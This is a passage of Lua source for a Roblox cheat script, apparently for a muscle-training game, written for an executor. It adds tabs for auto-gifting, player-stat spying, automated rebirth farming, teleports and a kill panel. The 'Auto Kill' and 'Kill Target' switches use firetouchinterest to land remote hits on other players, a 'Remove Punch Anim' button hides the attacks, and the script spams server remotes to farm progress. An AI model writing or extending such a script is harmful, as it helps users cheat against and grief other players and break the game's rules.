	if MP3_URL ~= "" then
		tempIndex = tempIndex + 1
		local tempFile = "GenesisMusic_"..tempIndex..".mp3"
		pcall(function()
			if isfile(tempFile) then delfile(tempFile) end
			writefile(tempFile, game:HttpGet(MP3_URL))
		end)
		table.insert(Playlist, MP3_URL)
		savePlaylist()
	end
end)

extraTab:AddButton("Play Playlist", function()
	if #Playlist > 0 then
		currentIndex = 1
		loadMP3(Playlist[currentIndex])
	end
end)

extraTab:AddButton("Next", function()
	if #Playlist > 0 then
		currentIndex = currentIndex + 1
		if currentIndex > #Playlist then currentIndex = 1 end
		loadMP3(Playlist[currentIndex])
	end
end)

extraTab:AddButton("Previous", function()
	if #Playlist > 0 then
		currentIndex = currentIndex - 1
		if currentIndex < 1 then currentIndex = #Playlist end
		loadMP3(Playlist[currentIndex])
	end
end)

extraTab:AddButton("Clear Playlist", function()
	Playlist = {}
	savePlaylist()
	currentIndex = 0
end)

local Gift = window:AddTab("Auto Gift")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RS = game:GetService("ReplicatedStorage")


-- Labels for item counts
Gift:AddLabel("Gifting Protein egg:").TextSize = 22
local proteinEggLabel = Gift:AddLabel("Protein Eggs: 0")
proteinEggLabel.TextSize = 20

Gift:AddLabel("Gifting Tropical Shakes:").TextSize = 22
local tropicalShakeLabel = Gift:AddLabel("Tropical Shakes: 0")
tropicalShakeLabel.TextSize = 18

-- Dropdown helper
local function createPlayerDropdown(title, callback)
	local drop = Gift:AddDropdown(title, callback)
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then drop:Add(plr.DisplayName) end
	end
	Players.PlayerAdded:Connect(function(plr)
		if plr ~= LocalPlayer then drop:Add(plr.DisplayName) end
	end)
	return drop
end

-- Protein Egg gifting
local selectedEggPlayer = nil
local eggCount = 0

createPlayerDropdown("Player to Gift Eggs", function(display)
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr.DisplayName == display then
			selectedEggPlayer = plr
			break
		end
	end
end)

Gift:AddTextBox("Amount of Eggs", function(text)
	eggCount = tonumber(text) or 0
end)

Gift:AddButton("Gift Eggs", function()
	if not selectedEggPlayer or eggCount <= 0 then return end
	for _ = 1, eggCount do
		local egg = LocalPlayer.consumablesFolder:FindFirstChild("Protein Egg")
		if egg then
			RS.rEvents.giftRemote:InvokeServer("giftRequest", selectedEggPlayer, egg)
			task.wait(0.1)
		end
	end
end)

-- Tropical Shake gifting
local selectedShakePlayer = nil
local shakeCount = 0

createPlayerDropdown("Player to Gift Tropical Shakes", function(display)
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr.DisplayName == display then
			selectedShakePlayer = plr
			break
		end
	end
end)

Gift:AddTextBox("Tropical Shakes gift", function(text)
	shakeCount = tonumber(text) or 0
end)

Gift:AddButton("Gift Tropical Shakes", function()
	if not selectedShakePlayer or shakeCount <= 0 then return end
	for _ = 1, shakeCount do
		local shake = LocalPlayer.consumablesFolder:FindFirstChild("Tropical Shake")
		if shake then
			RS.rEvents.giftRemote:InvokeServer("giftRequest", selectedShakePlayer, shake)
			task.wait(0.1)
		end
	end
end)

-- Update item counts
local function updateItemCount()
	local eggs, shakes = 0, 0
	for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
		if item.Name == "Protein Egg" then
			eggs += 1
		elseif item.Name == "Tropical Shake" then
			shakes += 1
		end
	end
	proteinEggLabel.Text = "Protein Eggs: " .. eggs
	tropicalShakeLabel.Text = "Tropical Shakes: " .. shakes
end

task.spawn(function()
	while true do
		updateItemCount()
		task.wait(0.25)
	end
end)

-- Auto Eat System
local itemList = {
	"Tropical Shake", "Energy Shake", "Protein Bar",
	"TOUGH Bar", "Protein Shake", "ULTRA Shake", "Energy Bar"
}

local function formatEventName(name)
	local parts = {}
	for word in name:gmatch("%S+") do parts[#parts+1] = word:lower() end
	for i = 2, #parts do
		parts[i] = parts[i]:sub(1,1):upper() .. parts[i]:sub(2)
	end
	return table.concat(parts)
end

local function activateRandomItems(count)
	local items = {unpack(itemList)}
	for i = #items, 2, -1 do
		local j = math.random(i)
		items[i], items[j] = items[j], items[i]
	end
	for i = 1, math.min(count, #items) do
		local name = items[i]
		local tool = LocalPlayer.Character:FindFirstChild(name) or LocalPlayer.Backpack:FindFirstChild(name)
		if tool then
			LocalPlayer.muscleEvent:FireServer(formatEventName(name), tool)
		end
	end
end

local eatingRunning = false
task.spawn(function()
	while true do
		if eatingRunning then activateRandomItems(4) end
		task.wait(0.5)
	end
end)

Gift:AddButton("Eat Everything", function(state)
	eatingRunning = state
	if state then activateRandomItems(4) end
end)
local SpecsTab = window:AddTab("spy ")

SpecsTab:AddLabel("Player Stats:").TextSize = 24

local playerToInspect = nil

local emojiMap = {
	["Time"] = utf8.char(),
	["Stats"] = utf8.char(),
	["Strength"] = utf8.char(),
	["Rebirths"] = utf8.char(),
	["Durability"] = utf8.char(),
	["Kills"] = utf8.char(),
	["Agility"] = utf8.char(),
	["Evil Karma"] = utf8.char(),
	["Good Karma"] = utf8.char(),
	["Brawls"] = utf8.char(),
}

local statDefinitions = {
	{ name = "Strength", statName = "Strength" },
	{ name = "Rebirths", statName = "Rebirths" },
	{ name = "Durability", statName = "Durability" },
	{ name = "Agility", statName = "Agility" },
	{ name = "Kills", statName = "Kills" },
	{ name = "Evil Karma", statName = "evilKarma" },
	{ name = "Good Karma", statName = "goodKarma" },
	{ name = "Brawls", statName = "Brawls" },
}

local function getCurrentPlayers()
	local playersList = {}
	for _, p in ipairs(Players:GetPlayers()) do
		table.insert(playersList, p)
	end
	return playersList
end

local specDropdown = SpecsTab:AddDropdown("Choose Player", function(text)
	for _, player in ipairs(getCurrentPlayers()) do
		local optionText = player.DisplayName .. " | " .. player.Name
		if text == optionText then
			playerToInspect = player
			updateStatLabels(playerToInspect)
			break
		end
	end
end)

for _, player in ipairs(getCurrentPlayers()) do
	specDropdown:Add(player.DisplayName .. " | " .. player.Name)
end

Players.PlayerAdded:Connect(function(player)
	specDropdown:Add(player.DisplayName .. " | " .. player.Name)
end)

Players.PlayerRemoving:Connect(function()
	specDropdown:Clear()
	for _, p in ipairs(getCurrentPlayers()) do
		specDropdown:Add(p.DisplayName .. " | " .. p.Name)
	end
end)

local playerNameLabel = SpecsTab:AddLabel("Name: N/A")
playerNameLabel.TextSize = 20

local playerUsernameLabel = SpecsTab:AddLabel("Username: N/A")
playerUsernameLabel.TextSize = 20

local statLabels = {}
for _, info in ipairs(statDefinitions) do
	statLabels[info.name] =
		SpecsTab:AddLabel(emojiMap[info.name] .. " " .. info.name .. ": 0 (0)")
	statLabels[info.name].TextSize = 20
end

local function formatNumber(n)
	if n >= 1e15 then
		return string.format("%.1fqa", n / 1e15)
	elseif n >= 1e12 then
		return string.format("%.1ft", n / 1e12)
	elseif n >= 1e9 then
		return string.format("%.1fb", n / 1e9)
	elseif n >= 1e6 then
		return string.format("%.1fm", n / 1e6)
	elseif n >= 1e3 then
		return string.format("%.1fk", n / 1e3)
	else
		return tostring(n)
	end
end

local function formatWithCommas(n)
	local formatted = tostring(n)
	while true do
		formatted, k = formatted:gsub("^(-?%d+)(%d%d%d)", "%1,%2")
		if k == 0 then
			break
		end
	end
	return formatted
end

local function updateStatLabels(targetPlayer)
	if not targetPlayer then
		return
	end

	playerNameLabel.Text = "Name: " .. targetPlayer.DisplayName
	playerUsernameLabel.Text = "Username: " .. targetPlayer.Name

	local leaderstats = targetPlayer:FindFirstChild("leaderstats")
	if not leaderstats then
		return
	end

	for _, info in ipairs(statDefinitions) do
		local statObject

		if leaderstats:FindFirstChild(info.statName) then
			statObject = leaderstats:FindFirstChild(info.statName)
		elseif targetPlayer:FindFirstChild(info.statName) then
			statObject = targetPlayer:FindFirstChild(info.statName)
		end

		if statObject then
			local value = statObject.Value
			local emoji = emojiMap[info.name] or ""
			statLabels[info.name].Text = string.format(
				"%s %s: %s (%s)",
				emoji,
				info.name,
				formatNumber(value),
				formatWithCommas(value)
			)
		else
			statLabels[info.name].Text =
				emojiMap[info.name] .. " " .. info.name .. ": 0 (0)"
		end
	end
end

task.spawn(function()
	while true do
		if playerToInspect then
			updateStatLabels(playerToInspect)
		end
		task.wait(0.2)
	end
end)

task.spawn(function()
	while true do
		if playerToInspect then
			updateAdvancedStats(playerToInspect)
		else
			updateAdvancedStats(nil)
		end
		task.wait(0.1)
	end
end)

local function checkCharacter()
	if not Players.LocalPlayer.Character then
		repeat
			task.wait()
		until Players.LocalPlayer.Character
	end
	return Players.LocalPlayer.Character
end

local function gettool()
	for _, v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
		if v.Name == "Punch" and Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
			Players.LocalPlayer.Character.Humanoid:EquipTool(v)
		end
	end

	Players.LocalPlayer.muscleEvent:FireServer("punch", "leftHand")
	Players.LocalPlayer.muscleEvent:FireServer("punch", "rightHand")
end

local function isPlayerAlive(player)
	return player
		and player.Character
		and player.Character:FindFirstChild("HumanoidRootPart")
		and player.Character:FindFirstChild("Humanoid")
		and player.Character.Humanoid.Health > 0
end

local function killPlayer(target)
	if not isPlayerAlive(target) then
		return
	end

	local character = checkCharacter()
	if character and character:FindFirstChild("LeftHand") then
		pcall(function()
			firetouchinterest(target.Character.HumanoidRootPart, character.LeftHand, 0)
			firetouchinterest(target.Character.HumanoidRootPart, character.LeftHand, 1)
			gettool()
		end)
	end
end

local strengthStartValue = 0
local durabilityStartValue = 0
local rebirthsStartValue = 0
local killsStartValue = 0
local brawlsStartValue = 0

local strengthStartTime = 0
local durabilityStartTime = 0
local rebirthsStartTime = 0
local killsStartTime = 0
local brawlsStartTime = 0

local strengthActive = false
local durabilityActive = false
local rebirthsActive = false
local killsActive = false
local brawlsActive = false

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local player = Players.LocalPlayer

local papuTab = window:AddTab("Farm renas")

--// FAST REBIRTH
local AutoFarming = false
local startTime = 0

local strengthPet = "Swift Samurai"
local rebirthPet = "Tribal Overlord"

--// UNEQUIP PETS
local function unequipAllPets()

    local petsFolder = player:FindFirstChild("petsFolder")

    if not petsFolder then
        return
    end

    for _, folder in pairs(petsFolder:GetChildren()) do
        if folder:IsA("Folder") then

            for _, pet in pairs(folder:GetChildren()) do

                ReplicatedStorage.rEvents.equipPetEvent:FireServer(
                    "unequipPet",
                    pet
                )
            end
        end
    end

    task.wait(0.1)
end

--// EQUIP PET
local function equipPetByName(petName)

    local petsFolder = player:FindFirstChild("petsFolder")

    if not petsFolder then
        return
    end

    for _, folder in pairs(petsFolder:GetChildren()) do
        if folder:IsA("Folder") then

            for _, pet in pairs(folder:GetChildren()) do

                if pet.Name == petName then

                    ReplicatedStorage.rEvents.equipPetEvent:FireServer(
                        "equipPet",
                        pet
                    )
                end
            end
        end
    end
end

--// GOLDEN REBIRTH
local function getGoldenRebirth()

    local ultimates = player:FindFirstChild("ultimatesFolder")

    if ultimates and ultimates:FindFirstChild("Golden Rebirth") then
        return ultimates["Golden Rebirth"].Value
    end

    return 0
end

--// NEEDED STRENGTH
local function getNeededStrength()

    local rebirths = player.leaderstats.Rebirths.Value
    local golden = getGoldenRebirth()

    local needed = 10000 + (5000 * rebirths)

    if golden >= 1 and golden <= 5 then
        needed = needed * (1 - (golden * 0.1))
    end

    return math.floor(needed)
end

--// START FAST REBIRTH
local function startFastRebirth()

    if AutoFarming then
        return
    end

    AutoFarming = true
    startTime = tick()

    warn("⚡ Fast Rebirth ACTIVADO")

    task.spawn(function()

        while AutoFarming do

            local neededStrength = getNeededStrength()

            print("Necesario:", neededStrength)

            -- Strength Pets
            unequipAllPets()
            equipPetByName(strengthPet)

            -- Farm
            while AutoFarming and
                player.leaderstats.Strength.Value < neededStrength do

                for i = 1, 10 do
                    player.muscleEvent:FireServer("rep")
                end

                task.wait()
            end

            if not AutoFarming then
                break
            end

            -- Rebirth Pets
            unequipAllPets()
            equipPetByName(rebirthPet)

            -- Rebirth
            ReplicatedStorage.rEvents.rebirthRemote:InvokeServer(
                "rebirthRequest"
            )

            print("✅ Rebirth realizado")

            task.wait(0.2)
        end

        warn("🛑 Fast Rebirth DESACTIVADO")
    end)
end

--// STOP
local function stopFastRebirth()
    AutoFarming = false
end

--// TOGGLE
papuTab:AddSwitch("Fast Rebirth", false, function(v)

    if v then
        startFastRebirth()
    else
        stopFastRebirth()
    end
end)



local teleport = window:AddTab("Tp")

teleport:AddButton("Spawn", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoidRootPart.CFrame = CFrame.new(2, 8, 115)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Teletransporte",
        Text = "Teleported to Spawn",
        Duration = 0
    })
end)

teleport:AddButton("Secret Area", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoidRootPart.CFrame = CFrame.new(1947, 2, 6191)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Teletransporte",
        Text = "Teleported to Secret Area",
        Duration = 0
    })
end)

teleport:AddButton("Tiny Island", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoidRootPart.CFrame = CFrame.new(-34, 7, 1903)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Teletransporte",
        Text = "Teleported to Tiny Island",
        Duration = 0
    })
end)

teleport:AddButton("Frozen Island", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoidRootPart.CFrame = CFrame.new(- 2600.00244, 3.67686558, - 403.884369, 0.0873617008, 1.0482899e-09, 0.99617666, 3.07204253e-08, 1, - 3.7464023e-09, - 0.99617666, 3.09302628e-08, 0.0873617008)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Teletransporte",
        Text = "Teleported to Frozen Island",
        Duration = 0
    })
end)

teleport:AddButton("Mythical Island", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoidRootPart.CFrame = CFrame.new(2255, 7, 1071)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Teletransporte",
        Text = "Teleported to Mythical Island",
        Duration = 0
    })
end)

teleport:AddButton("Hell Island", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoidRootPart.CFrame = CFrame.new(-6768, 7, -1287)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Teletransporte",
        Text = "Teleported to Hell Island",
        Duration = 0
    })
end)

teleport:AddButton("Legend Island", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoidRootPart.CFrame = CFrame.new(4604, 991, -3887)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Teletransporte",
        Text = "Teleported to Legend Island",
        Duration = 0
    })
end)

teleport:AddButton("Muscle King Island", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoidRootPart.CFrame = CFrame.new(-8646, 17, -5738)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Teletransporte",
        Text = "Teleported to Muscle King",
        Duration = 0
    })
end)

teleport:AddButton("Jungle Island", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoidRootPart.CFrame = CFrame.new(-8659, 6, 2384)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Teletransporte",
        Text = "Teleported to Jungle Island",
        Duration = 0
    })
end)

teleport:AddButton("Brawl Lava", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoidRootPart.CFrame = CFrame.new(4471, 119, -8836)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Teletransporte",
        Text = "Teleported to Brawl Lava",
        Duration = 0
    })
end)

teleport:AddButton("Brawl Desert", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoidRootPart.CFrame = CFrame.new(960, 17, -7398)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Teletransporte",
        Text = "Teleported to Brawl Desert",
        Duration = 0
    })
end)

teleport:AddButton("Brawl Regular", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoidRootPart.CFrame = CFrame.new(-1849, 20, -6335)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Teletransporte",
        Text = "Teleported to Brawl Regular",
        Duration = 0
    })
end)


local Killer = window:AddTab("K")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local playerWhitelist = {}
local targetPlayerNames = {}
local autoGoodKarma = false
local autoBadKarma = false
local autoKill = false
local killTarget = false
local spying = false
local autoEquipPunch = false
local autoPunchNoAnim = false
local targetDropdownItems = {}
local availableTargets = {}

local titleLabel = Killer:AddLabel("Equipar pet de dura o daño")
titleLabel.TextSize = 14
titleLabel.Font = Enum.Font.Merriweather 
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

local dropdown = Killer:AddDropdown("Select Pet", function(text)
    local petsFolder = game.Players.LocalPlayer.petsFolder
    for _, folder in pairs(petsFolder:GetChildren()) do
        if folder:IsA("Folder") then
            for _, pet in pairs(folder:GetChildren()) do
                game:GetService("ReplicatedStorage").rEvents.equipPetEvent:FireServer("unequipPet", pet)
            end
        end
    end
    task.wait(0.2)

    local petName = text
    local petsToEquip = {}

    for _, pet in pairs(game.Players.LocalPlayer.petsFolder.Unique:GetChildren()) do
        if pet.Name == petName then
            table.insert(petsToEquip, pet)
        end
    end

    local maxPets = 8
    local equippedCount = math.min(#petsToEquip, maxPets)

    for i = 1, equippedCount do
        game:GetService("ReplicatedStorage").rEvents.equipPetEvent:FireServer("equipPet", petsToEquip[i])
        task.wait(0.1)
    end
end)

local Wild_Wizard = dropdown:Add("Wild Wizard")
local Powerful_Monster = dropdown:Add("Mighty Monster")


Killer:AddSwitch("Auto Good Karma", function(bool)
    autoGoodKarma = bool
    task.spawn(function()
        while autoGoodKarma do
            local playerChar = LocalPlayer.Character
            local rightHand = playerChar and playerChar:FindFirstChild("RightHand")
            local leftHand = playerChar and playerChar:FindFirstChild("LeftHand")
            if playerChar and rightHand and leftHand then
                for _, target in ipairs(Players:GetPlayers()) do
                    if target ~= LocalPlayer then
                        local evilKarma = target:FindFirstChild("evilKarma")
                        local goodKarma = target:FindFirstChild("goodKarma")
                        if evilKarma and goodKarma and evilKarma:IsA("IntValue") and goodKarma:IsA("IntValue") and evilKarma.Value > goodKarma.Value then
                            local rootPart = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
                            if rootPart then
                                firetouchinterest(rightHand, rootPart, 1)
                                firetouchinterest(leftHand, rootPart, 1)
                                firetouchinterest(rightHand, rootPart, 0)
                                firetouchinterest(leftHand, rootPart, 0)
                            end
                        end
                    end
                end
            end
            task.wait(0.01)
        end
    end)
end)

Killer:AddSwitch("Auto Bad Karma", function(bool)
    autoBadKarma = bool
    task.spawn(function()
        while autoBadKarma do
            local playerChar = LocalPlayer.Character
            local rightHand = playerChar and playerChar:FindFirstChild("RightHand")
            local leftHand = playerChar and playerChar:FindFirstChild("LeftHand")
            if playerChar and rightHand and leftHand then
                for _, target in ipairs(Players:GetPlayers()) do
                    if target ~= LocalPlayer then
                        local evilKarma = target:FindFirstChild("evilKarma")
                        local goodKarma = target:FindFirstChild("goodKarma")
                        if evilKarma and goodKarma and evilKarma:IsA("IntValue") and goodKarma:IsA("IntValue") and goodKarma.Value > evilKarma.Value then
                            local rootPart = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
                            if rootPart then
                                firetouchinterest(rightHand, rootPart, 1)
                                firetouchinterest(leftHand, rootPart, 1)
                                firetouchinterest(rightHand, rootPart, 0)
                                firetouchinterest(leftHand, rootPart, 0)
                            end
                        end
                    end
                end
            end
            task.wait(0.01)
        end
    end)
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local friendWhitelistActive = false

Killer:AddSwitch("Auto Whitelist Friends", function(state)
    friendWhitelistActive = state

    if state then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and LocalPlayer:IsFriendsWith(player.UserId) then
                playerWhitelist[player.Name] = true
            end
        end

        Players.PlayerAdded:Connect(function(player)
            if friendWhitelistActive and player ~= LocalPlayer and LocalPlayer:IsFriendsWith(player.UserId) then
                playerWhitelist[player.Name] = true
            end
        end)
    else
        for name in pairs(playerWhitelist) do
            local friend = Players:FindFirstChild(name)
            if friend and LocalPlayer:IsFriendsWith(friend.UserId) then
                playerWhitelist[name] = nil
            end
        end
    end
end)

Killer:AddTextBox("Whitelist", function(text)
    local target = Players:FindFirstChild(text)
    if target then
        playerWhitelist[target.Name] = true
    end
end)

Killer:AddTextBox("UnWhitelist", function(text)
    local target = Players:FindFirstChild(text)
    if target then
        playerWhitelist[target.Name] = nil
    end
end)

Killer:AddSwitch("Auto Kill", function(bool)
    autoKill = bool

    task.spawn(function()
        while autoKill do
            local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            local rightHand = character:FindFirstChild("RightHand")
            local leftHand = character:FindFirstChild("LeftHand")

            local punch = LocalPlayer.Backpack:FindFirstChild("Punch")
            if punch and not character:FindFirstChild("Punch") then
                punch.Parent = character
            end

            if rightHand and leftHand then
                for _, target in ipairs(Players:GetPlayers()) do
                    if target ~= LocalPlayer and not playerWhitelist[target.Name] then
                        local targetChar = target.Character
                        local rootPart = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
                        if rootPart then
                            pcall(function()
                                firetouchinterest(rightHand, rootPart, 1)
                                firetouchinterest(leftHand, rootPart, 1)
                                firetouchinterest(rightHand, rootPart, 0)
                                firetouchinterest(leftHand, rootPart, 0)
                            end)
                        end
                    end
                end
            end

            task.wait(0.05)
        end
    end)
end)

local targetDropdown = Killer:AddDropdown("Select Target", function(name)
    if name and not table.find(targetPlayerNames, name) then
        table.insert(targetPlayerNames, name)
    end
end)

Killer:AddTextBox("Remove Target", function(name)
    for i, v in ipairs(targetPlayerNames) do
        if v == name then
            table.remove(targetPlayerNames, i)
            break
        end
    end
end)

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        targetDropdown:Add(player.Name)
        targetDropdownItems[player.Name] = true
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        targetDropdown:Add(player.Name)
        targetDropdownItems[player.Name] = true
    end
end)

Players.PlayerRemoving:Connect(function(player)
    if targetDropdownItems[player.Name] then
        targetDropdownItems[player.Name] = nil
        targetDropdown:Clear()
        for name in pairs(targetDropdownItems) do
            targetDropdown:Add(name)
        end
    end

    for i = #targetPlayerNames, 1, -1 do
        if targetPlayerNames[i] == player.Name then
            table.remove(targetPlayerNames, i)
        end
    end
end)

Killer:AddSwitch("Start Kill Target", function(state)
    killTarget = state

    task.spawn(function()
        while killTarget do
            local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

            local punch = LocalPlayer.Backpack:FindFirstChild("Punch")
            if punch and not character:FindFirstChild("Punch") then
                punch.Parent = character
            end

            local rightHand = character:WaitForChild("RightHand", 5)
            local leftHand = character:WaitForChild("LeftHand", 5)

            if rightHand and leftHand then
                for _, name in ipairs(targetPlayerNames) do
                    local target = Players:FindFirstChild(name)
                    if target and target ~= LocalPlayer then
                        local rootPart = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
                        if rootPart then
                            pcall(function()
                                firetouchinterest(rightHand, rootPart, 1)
                                firetouchinterest(leftHand, rootPart, 1)
                                firetouchinterest(rightHand, rootPart, 0)
                                firetouchinterest(leftHand, rootPart, 0)
                            end)
                        end
                    end
                end
            end

            task.wait(0.05)
        end
    end)
end)

local spyTargetDropdown = Killer:AddDropdown("Select View Target", function(name)
    targetPlayerName = name
end)

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        spyTargetDropdown:Add(player.Name)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        spyTargetDropdown:Add(player.Name)
    end
end)

Players.PlayerRemoving:Connect(function(player)
    if player ~= LocalPlayer then
        spyTargetDropdown:Clear()
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                spyTargetDropdown:Add(plr.Name)
            end
        end
    end
end)

Killer:AddSwitch("View Player", function(bool)
    spying = bool
    if not spying then
        local cam = workspace.CurrentCamera
        cam.CameraSubject = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") or LocalPlayer
        return
    end
    task.spawn(function()
        while spying do
            local target = Players:FindFirstChild(targetPlayerName)
            if target and target ~= LocalPlayer then
                local humanoid = target.Character and target.Character:FindFirstChild("Humanoid")
                if humanoid then
                    workspace.CurrentCamera.CameraSubject = humanoid
                end
            end
            task.wait(0.1)
        end
    end)
end)

local button = Killer:AddButton("Remove Punch Anim", function()
    local blockedAnimations = {
        ["rbxassetid://3638729053"] = true,
        ["rbxassetid://3638767427"] = true,
    }

    local function setupAnimationBlocking()
        local char = game.Players.LocalPlayer.Character
        if not char or not char:FindFirstChild("Humanoid") then return end

        local humanoid = char:FindFirstChild("Humanoid")

        for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
            if track.Animation then
                local animId = track.Animation.AnimationId
                local animName = track.Name:lower()

                if blockedAnimations[animId] or
                    animName:match("punch") or
                    animName:match("attack") or
                    animName:match("right") then
                    track:Stop()
                end
            end
        end

        if not _G.AnimBlockConnection then
            local connection = humanoid.AnimationPlayed:Connect(function(track)
                if track.Animation then
                    local animId = track.Animation.AnimationId
                    local animName = track.Name:lower()

                    if blockedAnimations[animId] or
                        animName:match("punch") or
                        animName:match("attack") or
                        animName:match("right") then
                        track:Stop()
                    end
                end
            end)

            _G.AnimBlockConnection = connection
        end
    end

    setupAnimationBlocking()

    local function overrideToolActivation()
        local function processTool(tool)
            if tool and (tool.Name == "Punch" or tool.Name:match("Attack") or tool.Name:match("Right")) then
                if not tool:GetAttribute("ActivatedOverride") then
                    tool:SetAttribute("ActivatedOverride", true)

                    local connection = tool.Activated:Connect(function()
                        task.wait(0.05)

                        local char = game.Players.LocalPlayer.Character
                        if char and char:FindFirstChild("Humanoid") then
                            for _, track in pairs(char.Humanoid:GetPlayingAnimationTracks()) do
                                if track.Animation then
                                    local animId = track.Animation.AnimationId
                                    local animName = track.Name:lower()

                                    if blockedAnimations[animId] or
                                        animName:match("punch") or
                                        animName:match("attack") or
                                        animName:match("right") then
                                        track:Stop()
                                    end
                                end
                            end
                        end
                    end)

                    if not _G.ToolConnections then
                        _G.ToolConnections = {}
                    end
                    _G.ToolConnections[tool] = connection
                end
            end
        end

        for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            processTool(tool)
        end

        local char = game.Players.LocalPlayer.Character
        if char then
            for _, tool in pairs(char:GetChildren()) do
                if tool:IsA("Tool") then
                    processTool(tool)
                end
            end
        end

        if not _G.BackpackAddedConnection then
            _G.BackpackAddedConnection = game.Players.LocalPlayer.Backpack.ChildAdded:Connect(function(child)
                if child:IsA("Tool") then
                    task.wait(0.1)
                    processTool(child)
                end
            end)
        end

        if not _G.CharacterToolAddedConnection and char then
            _G.CharacterToolAddedConnection = char.ChildAdded:Connect(function(child)
                if child:IsA("Tool") then
                    task.wait(0.1)
                    processTool(child)
                end
            end)
        end
    end

    overrideToolActivation()

    if not _G.AnimMonitorConnection then
        _G.AnimMonitorConnection = game:GetService("RunService").Heartbeat:Connect(function()
            if tick() % 0.5 < 0.01 then
                local char = game.Players.LocalPlayer.Character
                if char and char:FindFirstChild("Humanoid") then
                    for _, track in pairs(char.Humanoid:GetPlayingAnimationTracks()) do
                        if track.Animation then
                            local animId = track.Animation.AnimationId
                            local animName = track.Name:lower()

                            if blockedAnimations[animId] or
                                animName:match("punch") or
                                animName:match("attack") or
                                animName:match("right") then
                                track:Stop()
                            end
                        end
                    end
                end
            end
        end)
    end

    if not _G.CharacterAddedConnection then
        _G.CharacterAddedConnection = game.Players.LocalPlayer.CharacterAdded:Connect(function(newChar)
            task.wait(1)
            setupAnimationBlocking()
            overrideToolActivation()

            if _G.CharacterToolAddedConnection then
                _G.CharacterToolAddedConnection:Disconnect()
            end

            _G.CharacterToolAddedConnection = newChar.ChildAdded:Connect(function(child)
                if child:IsA("Tool") then
                    task.wait(0.1)
                    processTool(child)
                end
            end)
        end)
    end
end)

function RecoveryPunch()
    if _G.AnimBlockConnection then
        _G.AnimBlockConnection:Disconnect()
        _G.AnimBlockConnection = nil
    end
    if _G.AnimMonitorConnection then
        _G.AnimMonitorConnection:Disconnect()
        _G.AnimMonitorConnection = nil
    end
    if _G.ToolConnections then
        for _, conn in pairs(_G.ToolConnections) do
            if conn then conn:Disconnect() end
        end
        _G.ToolConnections = nil
    end
    if _G.BackpackAddedConnection then
        _G.BackpackAddedConnection:Disconnect()
        _G.BackpackAddedConnection = nil
    end
